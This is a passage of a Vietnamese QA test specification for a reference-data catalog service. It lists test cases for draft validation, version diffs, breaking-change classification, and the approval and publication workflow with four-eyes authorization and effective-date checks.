- **Tiền điều kiện / dữ liệu** Bản nháp v2; bản ghi `KH01.L02` có `ETag` `"3"`.
- **Bước**
  1. Gọi `PATCH .../items/KH01.L02` với `If-Match: "3"`, thân `{"name":"Loại 2 (sửa)","attrs":{"viet_tat":"L2S"}}`.
  2. Trên UI-07-05, sửa trực tiếp ô tên trong bảng và nhấn Enter.
- **Mong đợi** `200`, `ETag` mới; chỉ khóa `viet_tat` trong `attrs` thay đổi (cập nhật kiểu hợp nhất JSON Merge Patch), các khóa khác giữ nguyên.

#### TC-07-061 · Kiểm tra hợp lệ toàn bản nháp không có lỗi
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-013 · API-07-016
- **Tiền điều kiện / dữ liệu** Bản nháp v2 hợp lệ.
- **Bước**
  1. Gọi `POST .../versions/draft:validate`.
- **Mong đợi** `200`, `{"valid":true,"errorCount":0,"stats":{...}}` với `stats` gồm số thêm, sửa, ngừng dùng, phá vỡ.

#### TC-07-062 · Kiểm tra hợp lệ toàn bản nháp phát hiện lỗi tích lũy
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API, IT
- **Truy vết** FR-07-013 · BR-07-014 · API-07-016
- **Tiền điều kiện / dữ liệu** Chèn trực tiếp vào CSDL (bằng vai trò kiểm thử) hai bản ghi vi phạm mà API đơn lẻ không bắt được do đổi lược đồ sau: một bản ghi `cap_quan_ly` ngoài miền mới, một bản ghi ACTIVE có cha DEPRECATED.
- **Bước**
  1. Gọi `POST .../versions/draft:validate`.
  2. Gọi `POST .../versions/draft:submit`.
- **Mong đợi** Bước 1 trả `200` với `valid = false`, `errors` liệt kê đủ 2 lỗi theo mã bản ghi. Bước 2 trả `422` `ERR-07-009` (không trình được bản nháp không hợp lệ).

#### TC-07-063 · Hiển thị bản ghi dạng bảng và dạng cây
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-018 · UI-07-02, 05 · API-07-026, 044 · LGC-DMDC-002
- **Tiền điều kiện / dữ liệu** CAT-LH v1; người dùng U-T68-VW.
- **Bước**
  1. Mở UI-07-02 tab Bản ghi, chế độ Bảng; đổi trang, sắp xếp theo tên, tìm "phan loai".
  2. Chuyển chế độ Cây; mở rộng `KH01`, `KH01.L01`.
  3. Dùng bàn phím mũi tên phải, trái để mở, thu nút cây.
- **Mong đợi** Bảng phân trang phía máy chủ 20 dòng mặc định (FR-00-021), sắp xếp đúng, tìm không dấu đúng. Cây tải theo nhánh khi mở (không tải toàn bộ), hiển thị tên cấp, số con. Điều hướng bàn phím theo mẫu WAI-ARIA tree.

#### TC-07-064 · Hủy bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-017 · API-07-015 · EN-07-07
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có thay đổi.
- **Bước**
  1. Gọi `DELETE /catalogs/LOAI_HINH_TC/versions/draft` với `If-Match`, thân `{"reason":"Làm lại"}`.
  2. Gọi `POST /catalogs/LOAI_HINH_TC/versions`.
- **Mong đợi** Bước 1 trả `204`; phiên bản chuyển `DISCARDED`, có dòng `version_review` hành động `DISCARD`. Bước 2 trả `201` với `version_no = 3` (không tái sử dụng số 2). KT: có.

#### TC-07-065 · Không hủy phiên bản đang duyệt, đã duyệt hoặc đã phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-017 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Ba phiên bản ở `IN_REVIEW`, `APPROVED`, `PUBLISHED` (trên ba danh mục thử).
- **Bước**
  1. Gọi `DELETE /catalogs/{c}/versions/{v}` cho từng phiên bản.
- **Mong đợi** Cả ba trả `409` `ERR-07-004`.

#### TC-07-066 · Thay đổi trên bản nháp không ảnh hưởng tra cứu phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-011 · BR-07-006 · ADR-051
- **Tiền điều kiện / dữ liệu** Bản nháp v2 đã đổi tên `KH01` và ngừng dùng `KH02.L03.P01`.
- **Bước**
  1. APP-T68-READ gọi `GET /catalogs/LOAI_HINH_TC/items/KH01` và `.../KH02.L03.P01`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/items` với `If-None-Match` bằng ETag lấy trước khi sửa nháp.
- **Mong đợi** Bước 1 trả dữ liệu của v1 (tên cũ, ACTIVE). Bước 2 trả `304`.

### TS-07-06 · So sánh phiên bản và phân loại thay đổi phá vỡ

**Mục tiêu.** Xác nhận báo cáo khác biệt giữa hai phiên bản liệt kê đúng bản ghi thêm, sửa, ngừng dùng, thay đổi thuộc tính và phân loại đúng phá vỡ hay không phá vỡ theo khung §3.18. Kết quả phân loại là đầu vào của quy tắc duyệt BR-07-012 và của đồng bộ BR-07-017 nên sai ở đây gây sai dây chuyền.

**Phủ.** FR-07-014; BR-07-012, 013; API-07-021; UI-07-07; ERR-07-006.

**Tiền điều kiện chung.** CAT-LH v1 PUBLISHED; bản nháp v2 có: 2 bản ghi thêm, 3 bản ghi đổi tên, 1 bản ghi đổi thuộc tính, 1 bản ghi đổi mã cha, 1 bản ghi ngừng dùng, 1 thuộc tính mới không bắt buộc. Người gọi U-T68-DA1.

#### TC-07-067 · So sánh bản nháp với phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-014 · API-07-021 · AT-07-009 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/versions/draft/diff?against=current`.
  2. Gọi lại với `?against=current&changeType=CHANGED&page=0&size=50`.
- **Mong đợi** `200`; `summary` = `{added:2, changed:4, deprecated:1, parentChanged:1, attributeAdded:1, breaking:2}` (đổi mã cha và ngừng dùng là phá vỡ). Mỗi mục có `itemCode`, `changeType`, `breaking`, `before`, `after` chỉ gồm trường thay đổi. Bước 2 lọc đúng.

#### TC-07-068 · Bộ phân loại thay đổi phá vỡ theo bảng quyết định
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** UT
- **Truy vết** FR-07-014 · BR-07-013 · khung §3.18
- **Tiền điều kiện / dữ liệu** Bảng quyết định dưới đây là dữ liệu tham số hóa (`@ParameterizedTest`).
- **Bước**
  1. Với mỗi dòng của bảng, dựng cặp phiên bản trước và sau tối thiểu rồi gọi bộ phân loại.
- **Mong đợi** Kết quả khớp bảng sau.

| Thay đổi | Phá vỡ |
|---|---|
| Thêm bản ghi | Không |
| Sửa tên bản ghi | Không |
| Sửa giá trị thuộc tính | Không |
| Thêm thuộc tính không bắt buộc | Không |
| Thêm thuộc tính bắt buộc có mặc định | Không |
| Ẩn thuộc tính, đổi nhãn, đổi thứ tự | Không |
| Ngừng dùng bản ghi | Có |
| Xóa bản ghi (chỉ có thể với bản ghi chưa phát hành, không xuất hiện trong diff với phiên bản đã phát hành) | Không áp dụng |
| Đổi mã cha | Có |
| Xóa thuộc tính | Có |
| Đổi kiểu thuộc tính | Có |
| Giảm `maxLength`, thu hẹp `enumValues`, tăng `minValue`, giảm `maxValue`, thêm `pattern` | Có |
| Nới `maxLength`, thêm giá trị vào `enumValues` | Không |
| Bật `required` cho thuộc tính đã có | Có |

#### TC-07-069 · So sánh với phiên bản không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-014 · ERR-07-006
- **Tiền điều kiện / dữ liệu** CAT-LH chỉ có v1, v2.
- **Bước**
  1. Gọi `GET .../versions/draft/diff?against=9`.
  2. Gọi `GET .../versions/9/diff?against=1`.
- **Mong đợi** Cả hai trả `404` `ERR-07-006`.

#### TC-07-070 · So sánh hai phiên bản đã phát hành không liền kề
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-014 · API-07-021
- **Tiền điều kiện / dữ liệu** `DVHC` có v1, v2, v3 (mục 2.4); người gọi U-PA.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/versions/3/diff?against=1`.
- **Mong đợi** `200`; kết quả là khác biệt trực tiếp giữa v1 và v3 (không phải cộng dồn từng bước): `99001`, `99002`, `99003`, `99005` và các huyện ở trạng thái ngừng dùng hoặc vắng mặt theo cách hệ thống quy ước; `99101`, `99102`, `99201` là thêm; `99004` là đổi tên.

#### TC-07-071 · Màn so sánh phiên bản trên giao diện
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-07-014 · UI-07-07
- **Tiền điều kiện / dữ liệu** Như chung; người dùng U-T68-DA1.
- **Bước**
  1. Mở UI-07-07 cho bản nháp v2; xem thẻ tổng hợp và bảng khác biệt.
  2. Bật bộ lọc "Chỉ thay đổi phá vỡ".
- **Mong đợi** Thẻ tổng hợp hiển thị đúng số liệu như TC-07-067; dòng phá vỡ có nhãn cảnh báo (không chỉ dùng màu, có biểu tượng và chữ); bộ lọc còn 2 dòng.

### TS-07-07 · Trình duyệt, duyệt, từ chối và phát hành phiên bản

**Mục tiêu.** Xác nhận máy trạng thái phiên bản (khung §3.5) với mọi chuyển hợp lệ và các chuyển không hợp lệ quan trọng; nguyên tắc bốn mắt theo D02-08 (người có `PERM-07-publish` không duyệt hoặc phát hành phiên bản do chính mình trình hoặc sửa lần cuối); ngưỡng thay đổi lớn; ràng buộc ngày hiệu lực; tác dụng phụ khi phát hành (đóng hiệu lực phiên bản trước, sinh ảnh chụp, đổi con trỏ, phát sự kiện).

**Phủ.** FR-07-015, 016; BR-07-005, 006, 007, 008, 011, 012, 026, 027; UC-07-06, 07; API-07-014, 017…020; UI-07-07; ERR-07-004, 015, 016, 017; EVT-07-04, 05, 06; FR-00-070…072.

**Tiền điều kiện chung.** CAT-LH `require_approval = true`; CAT-MUC `require_approval = false`; ngưỡng thay đổi lớn mặc định 10%; người soạn U-T68-DS-NV; người duyệt U-T68-DA1.

#### TC-07-072 · Trình duyệt bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015 · API-07-017 · UC-07-06 · EVT-07-04 · FR-00-070
- **Tiền điều kiện / dữ liệu** Bản nháp v2 của CAT-LH hợp lệ, `effectiveFrom` = 2026-12-01, có `legalBasis`.
- **Bước**
  1. U-T68-DS-NV gọi `POST /catalogs/LOAI_HINH_TC/versions/draft:submit` thân `{"comment":"Đề nghị duyệt"}`.
  2. Đọc topic `t68.rdm.catalog.submitted.v1`.
  3. U-T68-DA1 mở hộp "Việc của tôi".
- **Mong đợi** `200`; `status = IN_REVIEW`, `submittedBy` = U-T68-DS-NV; `version_review` có dòng `SUBMIT` kèm `diffStats`. EVT-07-04 phát đúng một lần (có `catalogCode`, `versionNo`, `submittedBy`, `diffStats`, đường dẫn tới UI-07-07). Hộp "Việc của tôi" của U-T68-DA1 có việc chờ duyệt. KT: có (SUBMIT).

#### TC-07-073 · Duyệt phiên bản bởi người khác người trình
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015 · BR-07-011 · API-07-018 · UI-07-07
- **Tiền điều kiện / dữ liệu** v2 `IN_REVIEW` do U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/2:approve` thân `{"comment":"Đồng ý"}`.
- **Mong đợi** `200`; `status = APPROVED`, `approvedBy` = U-T68-DA1; `version_review` có `APPROVE`. Không phát EVT-07-05. KT: có (APPROVE).

#### TC-07-074 · Phát hành phiên bản đã duyệt
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-006, 007 · API-07-020 · UC-07-07 · EVT-07-05 · ADR-053
- **Tiền điều kiện / dữ liệu** v2 `APPROVED`, `effectiveFrom` = 2026-12-01; v1 hiệu lực từ 2025-01-01 không có `effective_to`.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/2:publish`.
  2. Kiểm tra CSDL: `catalog_version` v1, v2; `catalog.current_version_id`.
  3. Kiểm tra kho đối tượng `s3://dh-t68-rdm/snapshots/LOAI_HINH_TC/2.json.gz` và `.csv`.
  4. Đọc topic `t68.rdm.catalog.published.v1`.
- **Mong đợi** `200`; v2 `PUBLISHED`, `publishedBy`, `publishedAt`, `snapshotUri`, `schemaHash` có giá trị; v1 `effective_to` = 2026-12-01 (BR-07-007). `current_version_id` trỏ v2 (con trỏ "phiên bản mới nhất đã phát hành"; phiên bản hiệu lực tại một thời điểm vẫn tính theo khoảng ngày). Ảnh chụp có số bản ghi bằng `item_count`, giải nén ra JSON hợp lệ, SHA-256 ghi trong metadata đối tượng. EVT-07-05 phát đúng một lần với `catalogCode`, `versionNo` = 2, `effectiveFrom`, `stats`, `breaking`, `snapshotUri`. KT: có (PUBLISH).

#### TC-07-075 · Phát hành lần đầu chuyển danh mục sang ACTIVE
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · khung §3.6 · API-07-020
- **Tiền điều kiện / dữ liệu** Danh mục `TC005_CAP_DO` DRAFT, v1 đã qua submit, approve.
- **Bước**
  1. U-T68-DA1 gọi `POST /catalogs/TC005_CAP_DO/versions/1:publish`.
  2. Gọi `GET /catalogs/TC005_CAP_DO`.
- **Mong đợi** `status` danh mục chuyển `DRAFT` → `ACTIVE`; v1 `PUBLISHED`. Danh mục xuất hiện trong `GET /catalogs?status=ACTIVE` và tra cứu được qua API khai thác.

#### TC-07-076 · Từ chối phiên bản, bắt buộc lý do
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015 · API-07-019 · EVT-07-06 · FR-00-072
- **Tiền điều kiện / dữ liệu** Phiên bản `IN_REVIEW` do U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/{v}:reject` thân `{}`.
  2. U-T68-DA1 gọi lại với `{"comment":"Thiếu căn cứ pháp lý"}`.
  3. U-T68-DS-NV sửa bản ghi trên phiên bản đó.
- **Mong đợi** Bước 1 trả `422` lỗi kiểm tra hợp lệ (trường `comment` bắt buộc). Bước 2 trả `200`, `status = DRAFT`; `version_review` lưu `REJECT` cùng lý do; EVT-07-06 phát một lần (người nhận là người trình). Bước 3 thành công vì phiên bản đã về `DRAFT`. KT: có (REJECT).

#### TC-07-077 · Người trình không được tự duyệt
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015 · BR-07-011 · ERR-07-015 · FR-00-071 · D02-08
- **Tiền điều kiện / dữ liệu** U-T68-DA2 (có cả DATA_STEWARD và DATA_APPROVER) soạn và trình bản nháp v2.
- **Bước**
  1. U-T68-DA2 gọi `POST .../versions/2:approve`.
  2. U-T68-DA2 gọi `POST .../versions/2:reject` (từ chối chính mình được phép rút lại hay không: kỳ vọng theo FRS là không, dùng thao tác này để kiểm tra).
- **Mong đợi** Bước 1 trả `403`, `ERR-07-015`; phiên bản giữ `IN_REVIEW`. Bước 2 trả `403` `ERR-07-015`. KT: nhật ký an ninh ghi nhận lần thử tự duyệt.

#### TC-07-078 · Người sửa lần cuối không được duyệt hoặc phát hành
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015, 016 · BR-07-011 · ERR-07-015 · khung §14.3
- **Tiền điều kiện / dữ liệu** U-T68-DA2 sửa một bản ghi trong bản nháp v2; sau đó U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA2 gọi `:approve`.
  2. U-T68-DA1 gọi `:approve` (hợp lệ), sau đó U-T68-DA2 gọi `:publish`.
  3. Với CAT-MUC (`require_approval = false`), U-T68-DA2 sửa bản nháp rồi tự gọi `:publish`.
- **Mong đợi** Bước 1 trả `403` `ERR-07-015`. Bước 2: duyệt thành công; `:publish` của U-T68-DA2 trả `403` `ERR-07-015`. Bước 3 trả `403` `ERR-07-015`.

#### TC-07-079 · Không sửa bản ghi của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-006 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 PUBLISHED.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions/1/items`.
  2. Gọi `PATCH .../versions/1/items/KH01`.
  3. Gọi `POST .../versions/1/items/KH01:deprecate`.
  4. Gọi `POST .../versions/1/items:batch`.
  5. (IT) Dùng vai trò ứng dụng `dh_data_app` chạy `UPDATE ph07_rdm.catalog_item SET name='x' WHERE version_id=<v1>`.
- **Mong đợi** Bước 1…4 trả `409` `ERR-07-004`. Bước 5 bị từ chối bởi ràng buộc ở CSDL (trigger hoặc chính sách chặn ghi vào phiên bản đã phát hành) nếu SDD chọn bảo vệ hai lớp; nếu SDD chỉ bảo vệ ở tầng ứng dụng thì bước 5 được ghi nhận là rủi ro chấp nhận (xem Q07-80). Băm nội dung v1 không đổi.

> **Câu hỏi mở Q07-80:** Tính bất biến của phiên bản đã phát hành có được bảo vệ ở tầng CSDL (trigger từ chối UPDATE/DELETE khi `status = PUBLISHED`) không? Ca TC-07-079 bước 5 cần câu trả lời từ SDD/CSDL.

#### TC-07-080 · Không sửa ngày hiệu lực, căn cứ của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-006 · API-07-014 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 PUBLISHED.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/1` đổi `effectiveFrom`, `legalBasis`.
- **Mong đợi** `409` `ERR-07-004`.

#### TC-07-081 · Không sửa bản ghi khi phiên bản đang duyệt hoặc đã duyệt
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012, 015 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Hai phiên bản ở `IN_REVIEW` và `APPROVED`.
- **Bước**
  1. Với mỗi phiên bản gọi `PATCH .../items/{code}`, `POST .../attributes`, `POST /import-jobs` (đích là phiên bản đó).
- **Mong đợi** Mọi lệnh trả `409` `ERR-07-004` (tác vụ nhập bị từ chối ngay khi tạo hoặc khi commit, tùy SDD; ca này kiểm tra không có dữ liệu nào bị ghi).

#### TC-07-082 · Không trình phiên bản đã hủy
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-015, 017 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Phiên bản số 2 `DISCARDED` (TC-07-064).
- **Bước**
  1. Gọi `POST .../versions/2:submit`.
- **Mong đợi** `409` `ERR-07-004`.

#### TC-07-083 · Không bỏ qua bước trình hoặc bước duyệt khi danh mục cần duyệt
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015, 016 · BR-07-026 · ERR-07-004
- **Tiền điều kiện / dữ liệu** CAT-LH `require_approval = true`; bản nháp v2 `DRAFT` rồi `IN_REVIEW`.
- **Bước**
  1. Khi `DRAFT`, U-T68-DA1 gọi `:approve`.
  2. Khi `DRAFT`, U-T68-DA1 gọi `:publish`.
  3. Khi `IN_REVIEW`, U-T68-DA1 gọi `:publish`.
- **Mong đợi** Cả ba trả `409` `ERR-07-004`.

#### TC-07-084 · Phát hành trực tiếp từ bản nháp khi không cần duyệt
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-016 · BR-07-026 · API-07-020 · EVT-07-05
- **Tiền điều kiện / dữ liệu** CAT-MUC 4 bản ghi, bản nháp do U-T68-DS-NV soạn: chỉ đổi tên 0 bản ghi và thêm 0… cụ thể: sửa mô tả thuộc tính và không đổi bản ghi nào (0% thay đổi, không phá vỡ). Người phát hành U-T68-DA1.
- **Bước**
  1. U-T68-DA1 gọi `POST /catalogs/MUC_DO_DVC/versions/draft:publish` với `effectiveFrom` hôm nay.
  2. Trên UI-07-07, kiểm tra nút hiển thị khi người dùng có `PERM-07-publish`.
- **Mong đợi** `200`; phiên bản chuyển thẳng `DRAFT` → `PUBLISHED`; `version_review` có `PUBLISH` (không có `SUBMIT`, `APPROVE`). EVT-07-05 phát; không phát EVT-07-04. Giao diện hiện nút "Phát hành" (không chỉ "Trình duyệt").

#### TC-07-085 · Phát hành trực tiếp bị chặn khi thay đổi vượt ngưỡng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015, 016 · BR-07-012, 026 · ERR-07-016 · AT-07-010 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Danh mục `TC085_DM` 100 bản ghi, `require_approval = false`; bản nháp thêm 11 bản ghi (11%).
- **Bước**
  1. U-T68-DA1 gọi `:publish` trên bản nháp.
  2. Mở UI-07-07.
- **Mong đợi** `409` `ERR-07-016`, chi tiết có tỉ lệ 11% và ngưỡng 10%. Giao diện vô hiệu nút "Phát hành" kèm giải thích, chỉ còn "Trình duyệt".

#### TC-07-086 · Phát hành trực tiếp bị chặn khi có thay đổi phá vỡ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-012, 026 · ERR-07-016
- **Tiền điều kiện / dữ liệu** `TC085_DM` (`require_approval = false`), bản nháp chỉ ngừng dùng 1 bản ghi (1%, phá vỡ).
- **Bước**
  1. U-T68-DA1 gọi `:publish`.
  2. Trình duyệt bằng U-T68-DS-NV, U-T68-DA1 duyệt rồi phát hành.
- **Mong đợi** Bước 1 trả `409` `ERR-07-016`. Bước 2 thành công qua luồng duyệt.

#### TC-07-087 · Biên của ngưỡng thay đổi lớn
- **Loại** Biên · **Ưu tiên** P2 · **Tự động** API, UT
- **Truy vết** BR-07-012 · FR-07-053
- **Tiền điều kiện / dữ liệu** `TC085_DM` 100 bản ghi; ngưỡng 10%.
- **Bước**
  1. Bản nháp thêm đúng 10 bản ghi; gọi `:publish`.
  2. Bản nháp khác thêm 10 và sửa tên 1 (11 thay đổi); gọi `:publish`.
  3. Đổi tham số ngưỡng tenant `07.rdm.large-change-threshold-percent` = 20; lặp bước 2.
- **Mong đợi** Bước 1 trả `200` (bằng ngưỡng không phải vượt). Bước 2 trả `409` `ERR-07-016`. Bước 3 trả `200`. Cách tính tỉ lệ: số bản ghi thay đổi (thêm, sửa, ngừng dùng) chia số bản ghi của phiên bản hiện hành; danh mục chưa có phiên bản phát hành thì không áp ngưỡng.

> **Câu hỏi mở Q07-81:** Công thức tỉ lệ thay đổi (mẫu số là số bản ghi phiên bản hiện hành hay bản nháp; sửa thuộc tính có tính là thay đổi bản ghi) cần FRS chốt. TC-07-087 dùng công thức ghi trên.

#### TC-07-088 · Ngày hiệu lực không hợp lệ: thiếu, sớm hơn ngày phát hành, hồi tố có lý do
- **Loại** Âm, Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-027 · ERR-07-017
- **Tiền điều kiện / dữ liệu** Đồng hồ 2026-11-21; phiên bản `APPROVED` của `TC088_DM`; phiên bản `origin = SYNC` của `GIOI_TINH` chờ áp dụng.
- **Bước**
  1. Phát hành khi `effectiveFrom` rỗng.
  2. Phát hành với `effectiveFrom` = 2026-11-20 (`origin = MANUAL`).
  3. Phát hành phiên bản `origin = SYNC` với `effectiveFrom` = 2026-11-01 và `retroactiveReason` = "Quốc gia ban hành từ 01/11".
  4. Lặp bước 3 nhưng thiếu `retroactiveReason`.
- **Mong đợi** Bước 1, 2, 4 trả `422` `ERR-07-017`. Bước 3 trả `200`, lý do hồi tố lưu trong `change_note` hoặc trường riêng và trong kiểm toán.

#### TC-07-089 · Khoảng hiệu lực chồng lấn với phiên bản trước
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-007 · ERR-07-017 · AT-07-008 (SRS cũ)
- **Tiền điều kiện / dữ liệu** `TC089_DM` v1 hiệu lực từ 2026-12-15 (đã phát hành, sắp hiệu lực); v2 `APPROVED`.
- **Bước**
  1. Phát hành v2 với `effectiveFrom` = 2026-12-15.
  2. Phát hành v2 với `effectiveFrom` = 2026-12-10.
  3. Phát hành v2 với `effectiveFrom` = 2026-12-16.
- **Mong đợi** Bước 1, 2 trả `422` `ERR-07-017` (phải lớn hơn `effective_from` của phiên bản trước). Bước 3 trả `200`; v1 có `effective_to` = 2026-12-16. Ràng buộc loại trừ `daterange` trong CSDL (nếu có) không bị vi phạm.

#### TC-07-090 · Phiên bản sắp hiệu lực và tra cứu theo thời điểm
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016, 026 · BR-07-008 · ADR-051
- **Tiền điều kiện / dữ liệu** CAT-LH v2 phát hành ở TC-07-074 với `effectiveFrom` = 2026-12-01 (đổi tên `KH01`); đồng hồ 2026-11-21.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/versions` và xem nhãn.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH01`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH01?at=2026-12-01`.
  4. Đặt đồng hồ 2026-12-01T00:00:01+07:00 rồi gọi lại bước 2.
  5. Đặt đồng hồ 2026-11-30T23:59:59+07:00 (tương đương 2026-11-30T16:59:59Z) rồi gọi lại bước 2.
- **Mong đợi** Bước 1: v1 "Đang hiệu lực", v2 "Sắp hiệu lực". Bước 2 trả tên cũ (v1). Bước 3 trả tên mới. Bước 4 trả tên mới. Bước 5 trả tên cũ (ngày tính theo giờ Việt Nam, không theo UTC).

#### TC-07-091 · Quản trị tỉnh không được duyệt và phát hành
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015, 016 · D02-08 §3.1 · khung §14.2
- **Tiền điều kiện / dữ liệu** Phiên bản `IN_REVIEW` và một phiên bản `APPROVED`; CAT-MUC có bản nháp; người gọi U-T68-TA.
- **Bước**
  1. Gọi `:approve` trên phiên bản `IN_REVIEW`.
  2. Gọi `:publish` trên phiên bản `APPROVED`.
  3. Gọi `:publish` trên bản nháp CAT-MUC (không cần duyệt).
  4. Mở UI-07-07 bằng U-T68-TA.
- **Mong đợi** Bước 1…3 trả 403-PQ; trạng thái không đổi. Giao diện không hiện nút "Duyệt", "Phát hành" cho U-T68-TA.

#### TC-07-092 · Cán bộ quản lý danh mục không tự phát hành dù danh mục không cần duyệt
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-026 · D02-08 §3.1
- **Tiền điều kiện / dữ liệu** CAT-MUC có bản nháp dưới ngưỡng; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs/MUC_DO_DVC/versions/draft:publish`.
- **Mong đợi** 403-PQ (DATA_STEWARD không có `PERM-07-publish` theo D02-08; khung §4 cũ cho phép, đã bị §14 ghi đè). Gợi ý trên giao diện: chỉ có nút "Trình duyệt".

